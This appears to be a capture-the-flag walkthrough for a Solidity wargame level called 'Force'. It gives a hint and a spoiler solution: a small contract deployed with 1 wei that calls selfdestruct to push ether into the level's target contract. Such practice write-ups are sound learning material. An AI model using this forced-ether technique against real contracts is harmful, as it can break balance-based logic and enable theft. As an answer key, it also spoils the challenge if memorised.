# Force

**HINT:** Your going to want to go to remix IDE and create a contract that forces the contract to have a balance.
<details>
<summary>Answer</summary>
<p>

```
pragma solidity ^0.4.18;

contract Kill {
    
    function Kill() public payable {}
    
    function kill() public {
        selfdestruct(Instance_Address);
    }
}
```

Simply deploy the contract with 1 wei and then hit the kill button 
<br></br>
Then click submit
</p>
</details>